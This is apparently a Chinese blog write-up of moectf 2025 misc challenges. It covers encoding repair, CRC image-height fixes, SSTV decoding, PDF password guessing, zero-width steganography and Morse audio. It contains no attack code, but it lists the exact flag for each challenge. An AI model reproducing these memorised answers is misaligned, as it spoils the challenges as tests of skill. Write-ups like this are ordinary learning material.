+<p>moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}</p>
+<h3 id="ez_锟斤拷">ez_锟斤拷????
+</h3><hr>
+<p>E=hv在记事本里写下了一些神秘字符，但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了<strong>乱码</strong></p>
+<p>现在我把这个文件给你，请你帮助hv找回文件的秘密吧！</p>
+<p>请把得到的flag<strong>转换成半角字符上交</strong></p>
+<p>hint：此题解法与锟斤拷有关</p>
+<hr>
+<p>里面的txt内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>叫AI帮我解决：</p>
+<p><img src="/p/moectf_2025/10.png"
+	width="1125"
+	height="620"
+	srcset="/p/moectf_2025/10_hu_ca950a9e418e23e7.png 480w, /p/moectf_2025/10_hu_7583bea0a42070b.png 1024w"
+	loading="lazy"
+	
+		alt="豆包"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="435px"
+	
+></p>
+<p><img src="/p/moectf_2025/11.png"
+	width="1035"
+	height="460"
+	srcset="/p/moectf_2025/11_hu_803686b969d3e80a.png 480w, /p/moectf_2025/11_hu_9f1d81caee6e8f8d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="540px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fix_encoding_mismatch</span><span class="p">(</span><span class="n">garbled_text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    修复UTF-8与GBK编码不匹配导致的乱码
+</span></span></span><span class="line"><span class="cl"><span class="s2">    原理：乱码是&#34;UTF-8文本→误GBK解码→再UTF-8保存&#34;的结果，反向执行即可还原
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 1. 将乱码文本按GBK编码为字节流（还原错误解码前的原始字节）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gbk_bytes</span> <span class="o">=</span> <span class="n">garbled_text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;gbk&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 2. 将字节流按UTF-8解码（得到原始正确文本）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">original_text</span> <span class="o">=</span> <span class="n">gbk_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">original_text</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;解码失败：</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 你提供的乱码内容</span>
+</span></span><span class="line"><span class="cl"><span class="n">garbled_content</span> <span class="o">=</span> <span class="s2">&#34;锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 执行解码</span>
+</span></span><span class="line"><span class="cl"><span class="n">original_flag</span> <span class="o">=</span> <span class="n">fix_encoding_mismatch</span><span class="p">(</span><span class="n">garbled_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 输出结果（过滤无关字符，提取flag）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 从还原结果中提取flag格式内容（通常为flag{...}）</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;flag\{.*?\}&#39;</span><span class="p">,</span> <span class="n">original_flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">flag_match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">final_flag</span> <span class="o">=</span> <span class="n">flag_match</span><span class="o">.</span><span class="n">group</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;还原成功！半角flag为：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">final_flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;还原后的原始文本：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">original_flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">未匹配到flag格式，可手动查看上述文本中的flag&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全昔斤拷锟斤拷锟斤拷
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再转换成半角字符：moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}</p>
+<h3 id="weird_photo">weird_photo
+</h3><hr>
+<p>FLAG就在图中。</p>
+<p>什么，你说你看不见 FLAG？注意 CRC！</p>
+<hr>
+<p><img src="/p/moectf_2025/12.png"
+	width="900"
+	height="600"
+	srcset="/p/moectf_2025/12_hu_c193fc05f631cfdc.png 480w, /p/moectf_2025/12_hu_58c18d2513afdae3.png 1024w"
+	loading="lazy"
+	
+		alt="修改高宽"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="360px"
+	
+></p>
+<p>直接丢进随波逐流就梭出来了，当然不嫌麻烦可以用010editor去拉⾼图⽚</p>
+<p>moectf{Image_Height_Restored}</p>
+<h3 id="sstv">SSTV
+</h3><hr>
+<p>识别并解码附件中使用的特殊通信协议，以获取隐藏信息。</p>
+<hr>
+<p>搜索“SSTV解码”<a class="link" href="https://sstv-decoder.mathieurenaud.fr/"  target="_blank" rel="noopener"
+    >Online SSTV Decoder - Decode Slow Scan Television Audio to Images</a>看看：</p>
+<p><img src="/p/moectf_2025/13.png"
+	width="1365"
+	height="905"
+	srcset="/p/moectf_2025/13_hu_7229a7c7c6cbe339.png 480w, /p/moectf_2025/13_hu_22e69999525c2d29.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="361px"
+	
+></p>
+<p>moectf{d3codiNG_SStV_reQu1REs-PATI3nC3}</p>
+<h3 id="encrypted_pdf">encrypted_pdf
+</h3><hr>
+<p>这年头，啥都能带个密码，pdf也不例外。</p>
+<p>难道有密码就能拦住我堂堂misc手吗？？不可能的！</p>
+<hr>
+<p><img src="/p/moectf_2025/14.png"
+	width="1065"
+	height="573"
+	srcset="/p/moectf_2025/14_hu_cfa460e46103c2d4.png 480w, /p/moectf_2025/14_hu_bebd5ce88bfafa1e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="446px"
+	
+></p>
+<p>密码是qwe123，着我乱输几次就可以了。</p>
+<p>接下来就是全局搜索：</p>
+<p><img src="/p/moectf_2025/15.png"
+	width="1555"
+	height="770"
+	srcset="/p/moectf_2025/15_hu_dae8661c264835e0.png 480w, /p/moectf_2025/15_hu_ab442eb7c5692dd2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="484px"
+	
+></p>
+<p>最后在图片后面找到flag：</p>
+<p><img src="/p/moectf_2025/16.png"
+	width="1186"
+	height="421"
+	srcset="/p/moectf_2025/16_hu_44c067823239d49d.png 480w, /p/moectf_2025/16_hu_93dfe2c75a0eb3fa.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="281"
+		data-flex-basis="676px"
+	
+></p>
+<p>moectf{Pdf_1s_r3a1ly_c0lor4ul!!ihdw}</p>
+<h3 id="哈基米难没露躲">哈基米难没露躲
+</h3><hr>
+<p>出题人哈基米音乐听多了(bushi</p>
+<hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">南北绿豆奈哪买噶奈哪买南北绿豆；欧莫季里噶奈哪买噶奈哦吗吉利。哦吗吉利哪买噶奈哪椰奶龙？哈基米买娜奈哪买北窝那没撸多。哈基米多多压那奈椰奶龙；奈诺娜美嘎哪买娜奈哪买窝那没撸多？哦吗吉利噶奈哪买哈基米；窝那没撸多噶奈哪买噶奈哪哈基米。库路曼波买噶奈哪买哦吗吉利，哈基米娜奈哪买北南北绿豆，哦吗吉利多多压那多多欧莫季里。阿西噶压压那南撸基阿奈诺娜美嘎，哈基米南里南北友里窝那没撸多。库路曼波一吉豆没咕椰奶龙，库路曼波吉豆没咕吉豆椰奶龙。库路曼波没咕吉豆没咕库路曼波？哦吗吉利吉豆没米吉库路曼波。阿西噶压豆耶咕吉豆没米窝那没撸多；南北绿豆吉豆没米哈基米；窝那没撸多吉豆没咕吉奈诺娜美嘎。库路曼波豆没咕吉豆椰奶龙，欧莫季里没咕吉豆没咕吉南北绿豆？库路曼波豆没米吉豆欧莫季里。哦吗吉利耶咕吉豆没咕奶哈基米；窝那没撸多压多那吉豆没咕奈诺娜美嘎。阿西噶压吉豆没咕吉哦吗吉利；椰奶龙豆没咕吉豆没咕南北绿豆。窝那没撸多吉豆没米奶压哈基米，哈基米多那吉豆没米吉哈基米？奈诺娜美嘎豆没咕吉豆窝那没撸多，南北绿豆没咕吉豆没咕吉窝那没撸多，窝那没撸多豆没咕吉哦吗吉利；南北绿豆豆没咕吉豆没米窝那没撸多；南北绿豆吉豆耶咕吉豆椰奶龙。哈基米没米吉豆哈基米？库路曼波耶吗多奈哪买噶哈基米。哦吗吉利奈哪买噶奈哪阿西噶压；南北绿豆买噶奈哪窝那没撸多；阿西噶压买噶奈哪买阿西噶压；哈基米娜多多压那窝那没撸多？欧莫季里奈哪买北多奈诺娜美嘎；哦吗吉利多压那呀里欧西库路曼波。窝那没撸多奈哪买噶奈哈基米；南北绿豆哪买噶奈哪哦吗吉利，欧莫季里买噶奈哪买噶奈库路曼波，库路曼波哪买噶多多压那库路曼波。哈基米奈哪买噶奈哪买南北绿豆？椰奶龙娜奈哪买哈基米，窝那没撸多噶奈哪买奈诺娜美嘎？阿西噶压噶奈哪买噶奈哪哈基米，阿西噶压买噶奈哪买娜奈奈诺娜美嘎。奈诺娜美嘎哪买北奈哪买噶椰奶龙？哦吗吉利奈哪买北奈诺娜美嘎，窝那没撸多奈哪买噶奈哪窝那没撸多？阿西噶压买噶奈哪买噶奈欧莫季里。库路曼波哪买噶奈哈基米？阿西噶压哪买噶多多压那阿西噶压。窝那没撸多奈哪买北奈哪买阿西噶压；库路曼波噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶奈哈基米；椰奶龙哪买噶奈哪买哦吗吉利；南北绿豆噶奈哪买哈基米；哈基米噶多多压那奈诺娜美嘎？窝那没撸多奈哪买北奈哦吗吉利，库路曼波哪买娜奈椰奶龙。哈基米哪买噶奈哪欧莫季里？椰奶龙买噶奈哪买噶阿西噶压。哈基米奈哪买噶奈奈诺娜美嘎？欧莫季里哪买噶多多压那哦吗吉利，阿西噶压奈哪买娜奈哪买哦吗吉利，南北绿豆娜奈哪买噶奈哪哈基米；库路曼波买噶奈哪买窝那没撸多。哈基米噶奈哪买南北绿豆；椰奶龙噶奈哪买噶多多窝那没撸多，阿西噶压压那奈哪买椰奶龙，欧莫季里娜奈哪买奈诺娜美嘎，阿西噶压北奈哪买噶奈哪库路曼波。库路曼波买噶奈哪买噶奈阿西噶压？哈基米哪买噶奈南北绿豆，南北绿豆哪买娜奈哪买哈基米；哦吗吉利北奈哪买噶奈椰奶龙，库路曼波哪买北奈窝那没撸多，阿西噶压哪买噶奈哪买奈诺娜美嘎；奈诺娜美嘎噶奈哪买噶奈欧莫季里，阿西噶压哪买噶奈哪窝那没撸多。南北绿豆买噶多多阿西噶压，窝那没撸多压那奈哪阿西噶压？椰奶龙买北奈哪奈诺娜美嘎；窝那没撸多买娜奈哪买噶奈椰奶龙？哦吗吉利哪买噶奈阿西噶压。哈基米哪买噶奈哪窝那没撸多；库路曼波买噶奈哪买噶奈欧莫季里。南北绿豆哪买北多多压那窝那没撸多；欧莫季里奈哪买娜奈哪买奈诺娜美嘎；椰奶龙噶奈哪买噶窝那没撸多，奈诺娜美嘎奈哪买噶奈阿西噶压；阿西噶压哪买噶奈哪买娜阿西噶压；椰奶龙奈哪买北奈欧莫季里。奈诺娜美嘎哪买噶奈阿西噶压，椰奶龙哪买娜奈哪买欧莫季里？库路曼波噶奈哪买库路曼波。阿西噶压噶奈哪买噶窝那没撸多；窝那没撸多奈哪买噶奈哪买南北绿豆？阿西噶压噶多多压那椰奶龙，库路曼波奈哪买娜哈基米；窝那没撸多奈哪买噶阿西噶压，库路曼波喔酷娜利步啊那窝那没撸多？南北绿豆吉豆没咕吉豆欧莫季里；欧莫季里没咕吉豆没南北绿豆？库路曼波咕吉豆没咕库路曼波。哈基米吉豆没咕哦吗吉利？哈基米奶压多那吉豆库路曼波，库路曼波没咕吉豆耶咕阿西噶压，椰奶龙吉豆没咕吉豆没窝那没撸多？阿西噶压咕吉豆没咕欧莫季里。奈诺娜美嘎吉豆没咕吉豆哈基米？欧莫季里没咕奶压多那吉库路曼波；阿西噶压豆没咕奶椰奶龙；奈诺娜美嘎压多那吉南北绿豆，窝那没撸多豆没咕吉欧莫季里；南北绿豆豆没咕吉豆奈诺娜美嘎。库路曼波没咕吉豆奈诺娜美嘎，南北绿豆没咕吉豆没咕吉窝那没撸多？库路曼波豆耶咕奶压多阿西噶压，哈基米那吉豆没米吉豆窝那没撸多；哈基米没咕吉豆没咕吉南北绿豆？奈诺娜美嘎豆没咕吉豆没奈诺娜美嘎；南北绿豆咕吉豆没南北绿豆。奈诺娜美嘎咕奶压多那吉奈诺娜美嘎？南北绿豆豆没米吉椰奶龙；椰奶龙豆没咕吉豆没窝那没撸多？欧莫季里咕吉豆没咕吉豆库路曼波；欧莫季里没咕吉豆没咕南北绿豆？奈诺娜美嘎吉豆没咕奶窝那没撸多；南北绿豆压多那吉豆没咕哈基米？欧莫季里吉豆没米吉豆欧莫季里；阿西噶压没咕吉豆奈诺娜美嘎；阿西噶压没咕吉豆没咕吉椰奶龙，哈基米豆没咕吉豆没阿西噶压？南北绿豆咕奶压多那椰奶龙。欧莫季里吉豆没咕吉豆没库路曼波；哈基米吗喵子路路吉阿西噶压，窝那没撸多豆没咕吉豆哦吗吉利；南北绿豆没咕吉豆阿西噶压？阿西噶压没咕吉豆没南北绿豆；哈基米咕吉豆没咕窝那没撸多；阿西噶压奶压多那吉椰奶龙；库路曼波豆没咕吉豆没米阿西噶压，奈诺娜美嘎吉豆没咕吉窝那没撸多。阿西噶压豆没咕吉窝那没撸多，阿西噶压豆没咕吉豆欧莫季里？库路曼波没咕吉豆没窝那没撸多，库路曼波咕吉豆耶咕奶压窝那没撸多？哦吗吉利多那吉豆没米阿西噶压。哈基米吉豆没咕吉欧莫季里；南北绿豆豆没咕吉欧莫季里。南北绿豆豆没咕吉豆没咕南北绿豆？椰奶龙吉豆没米吉豆椰奶龙；库路曼波耶咕吉豆没阿西噶压？欧莫季里咕吉豆没米南北绿豆；南北绿豆吉豆没咕吉豆没哈基米；哦吗吉利咕吉豆没咕吉奈诺娜美嘎？窝那没撸多豆没咕吉豆库路曼波，库路曼波没咕奶压多那吉阿西噶压。窝那没撸多豆没咕吉豆库路曼波？阿西噶压没西一奈哪买噶阿西噶压；哦吗吉利奈哪买噶哦吗吉利；椰奶龙奈哪买噶奈南北绿豆，库路曼波哪买噶奈哪买娜库路曼波，哈基米奈哪买北奈哪买窝那没撸多。欧莫季里噶奈哪买北奈哈基米，椰奶龙哪买噶奈库路曼波？南北绿豆哪买噶奈欧莫季里；哈基米哪买噶奈椰奶龙，奈诺娜美嘎哪买噶奈哪南北绿豆，库路曼波买娜奈哪哦吗吉利？阿西噶压买北奈哪买娜奈库路曼波。欧莫季里哪买噶奈欧莫季里，库路曼波哪买噶奈哪买欧莫季里？库路曼波噶奈哪买噶奈窝那没撸多；阿西噶压哪买噶奈阿西噶压；窝那没撸多哪买噶奈哪买北南北绿豆。库路曼波多多压那欧莫季里？欧莫季里奈哪买娜奈哪哦吗吉利；哈基米买噶奈哪买噶奈库路曼波，库路曼波哪买噶奈库路曼波？奈诺娜美嘎哪买噶奈哪阿西噶压，南北绿豆买噶多多压库路曼波；南北绿豆那奈哪买娜奈库路曼波，库路曼波哪买北奈哪椰奶龙，欧莫季里买噶奈哪买库路曼波。窝那没撸多噶奈哪买噶窝那没撸多，哈基米奈哪买噶阿西噶压。南北绿豆奈哪买噶多椰奶龙？哈基米多压那奈哪阿西噶压；库路曼波买娜奈哪买欧莫季里？库路曼波娜奈哪买噶奈欧莫季里；哈基米哪买噶奈哪椰奶龙。窝那没撸多买噶奈哪奈诺娜美嘎；椰奶龙买噶奈哪买库路曼波，阿西噶压娜奈哪买北椰奶龙。奈诺娜美嘎奈哪买噶奈哈基米；窝那没撸多哪买北奈哪哈基米。奈诺娜美嘎买噶奈哪买噶窝那没撸多？南北绿豆奈哪买噶欧莫季里，库路曼波奈哪买噶奈哪买库路曼波。南北绿豆娜奈哪买南北绿豆；欧莫季里北奈哪买娜奈哦吗吉利。哈基米哪买娜子窝那没撸多；南北绿豆酷波利子撸娜哪哈基米？哈基米哈里椰路阿西噶压，阿西噶压奈哪买噶奈哪哈基米。哈基米买噶奈哪买噶库路曼波？欧莫季里奈哪买噶奈哪南北绿豆，奈诺娜美嘎买噶多多椰奶龙；阿西噶压压那奈哪库路曼波；库路曼波买噶多多压那奈库路曼波；哦吗吉利哪买噶奈哪买哦吗吉利。椰奶龙噶奈哪买噶奈窝那没撸多，阿西噶压哪买噶奈哪买噶欧莫季里，库路曼波多多压那奈库路曼波；窝那没撸多哪买噶多多压那哈基米，窝那没撸多喔米哦啊呀砸奈诺娜美嘎；椰奶龙曼吉豆没咕南北绿豆；库路曼波吉豆没咕吉豆没阿西噶压？哦吗吉利咕吉豆没咕吉哦吗吉利；库路曼波豆没咕奶压库路曼波。库路曼波多那吉豆南北绿豆？奈诺娜美嘎没米吉豆库路曼波；哦吗吉利耶吗一奈哪买奈诺娜美嘎。椰奶龙噶奈哪买噶奈阿西噶压？哈基米哪买噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶阿西噶压；窝那没撸多多多压那阿西噶压，阿西噶压奈哪买北奈阿西噶压，欧莫季里哪买噶奈哪买噶哈基米。哈基米奈哪买噶奈诺娜美嘎？哈基米奈哪买噶库路曼波。南北绿豆奈哪买噶奈哪阿西噶压，奈诺娜美嘎买噶多多压那欧莫季里；南北绿豆奈哪买噶哈基米，窝那没撸多奈哪买北奈哪买南北绿豆，欧莫季里噶奈哪买奈诺娜美嘎？哦吗吉利噶奈哪买哈基米；南北绿豆噶奈哪买南北绿豆；窝那没撸多噶奈哪买娜奈哪椰奶龙，欧莫季里买北奈哪买噶阿西噶压，库路曼波多多压那奈哪买哈基米；哈基米噶奈哪买噶窝那没撸多？欧莫季里奈哪买噶奈哪买哦吗吉利。阿西噶压噶奈哪买噶多哦吗吉利，阿西噶压多压那奈哪买阿西噶压，哈基米北奈哪买南北绿豆，南北绿豆噶奈哪买噶奈阿西噶压，欧莫季里哪买噶奈哦吗吉利。椰奶龙哪买噶奈哈基米，库路曼波哪买噶奈窝那没撸多，奈诺娜美嘎哪买噶多窝那没撸多，椰奶龙多压那奈哪买噶南北绿豆，阿西噶压奈哪买北奈哈基米；哈基米哪买噶奈哪奈诺娜美嘎，哦吗吉利买噶奈哪买噶奈阿西噶压，窝那没撸多哪买噶奈哪阿西噶压。窝那没撸多买娜多多椰奶龙；椰奶龙压那多多压奈诺娜美嘎；阿西噶压那奈哪买娜南北绿豆。哦吗吉利自米哦啊南北绿豆；奈诺娜美嘎南酷基压步酷欧莫季里；奈诺娜美嘎马美友喔奈诺娜美嘎；窝那没撸多诺哪呀喔喵欧莫季里；欧莫季里哩椰奶龙。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>给了一堆哈机密语&hellip;</p>
+<p><a class="link" href="https://lhlnb.top/hajimi/base64"  target="_blank" rel="noopener"
+    >哈基米语翻译</a></p>
+<p><img src="/p/moectf_2025/17.png"
+	width="1590"
+	height="730"
+	srcset="/p/moectf_2025/17_hu_5e9e8a2c266e5b7e.png 480w, /p/moectf_2025/17_hu_aeb319ca9c191660.png 1024w"
+	loading="lazy"
+	
+		alt="哈吉咪语方言翻译"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="522px"
+	
+></p>
+<p>？？这是‌‌‌‌‍‬﻿‍‌‌‌‌‍‬﻿﻿fakeflag‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬{‌‌‌‌‍﻿‬﻿you‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‍‌_can_‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌﻿‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‌try‌‌‌‌‌﻿‌‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‌‍_‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‌‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍searching‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌﻿_text‌‌‌‌‌﻿‍‬_‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍﻿﻿‍Steganography}？？？</p>
+<p>怪怪的。</p>
+<p><img src="/p/moectf_2025/18.png"
+	width="600"
+	height="201"
+	srcset="/p/moectf_2025/18_hu_fd773d63fb1363.png 480w, /p/moectf_2025/18_hu_ae8172383d49c08d.png 1024w"
+	loading="lazy"
+	
+		alt="零宽隐写"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="716px"
+	
+></p>
+<p>这字符串内容有提示，复制解密得到的fakeflag，⽤零宽隐写解密。</p>
+<p><img src="/p/moectf_2025/19.png"
+	width="980"
+	height="441"
+	srcset="/p/moectf_2025/19_hu_48c4da91988c4b66.png 480w, /p/moectf_2025/19_hu_7261d2af2ebe70be.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="533px"
+	
+></p>
+<p>moectf{1b8956b9-a423-4101-a1bd-65be33682c82}</p>
+<h3 id="捂住一只耳">捂住一只耳
+</h3><hr>
+<p>一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音</p>
+<p>flag 形式以moectf{}包裹提交，忽略大小写</p>
+<hr>
+<p>听得我耳朵疼呀，用audacity分析：</p>
+<p><img src="/p/moectf_2025/20.png"
+	width="1139"
+	height="633"
+	srcset="/p/moectf_2025/20_hu_2a32c26a5fe2c064.png 480w, /p/moectf_2025/20_hu_83882600480308a3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="431px"
+	
+></p>
+<p>发现另外一声道的音频不一致，我们单独分离出来：</p>
+<p><img src="/p/moectf_2025/21.png"
+	width="1140"
+	height="186"
+	srcset="/p/moectf_2025/21_hu_4df6dba43ca6b46c.png 480w, /p/moectf_2025/21_hu_a2251093099a496d.png 1024w"
+	loading="lazy"
+	
+		alt="摩斯密码"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="612"
+		data-flex-basis="1470px"
+	
+></p>
+<p>解码：</p>
+<p><img src="/p/moectf_2025/22.png"
+	width="1714"
+	height="686"
+	srcset="/p/moectf_2025/22_hu_5ffce3e1ddb84a05.png 480w, /p/moectf_2025/22_hu_1ef17338a7933c4d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="599px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. -. ..--.- -..- -.. ..-
+</span></span><span class="line"><span class="cl">FLAGIS:HALF_RADIO_IN_XDU
+</span></span><span class="line"><span class="cl">HALF_RADIO_IN_XDU
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="enchantment">Enchantment
+</h3><hr>
+<p>哇多么好的附魔啊</p>
+<p>你把图片发了出去，但似乎附魔台上的文字有一些不对劲？</p>
+<p>注：请将最终结果按单词以_分离并包上moectf{}提交，忽略大小写</p>
+<hr>
+<p>“你把图片发了出去”&hellip;OK我知道了，这作者把图片发出去了，涉及upload上传，给我把upload流量提取出来！！</p>
+<p>搜索指令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http.request.method == &#34;POST&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/moectf_2025/23.png"
+	width="1510"
+	height="826"
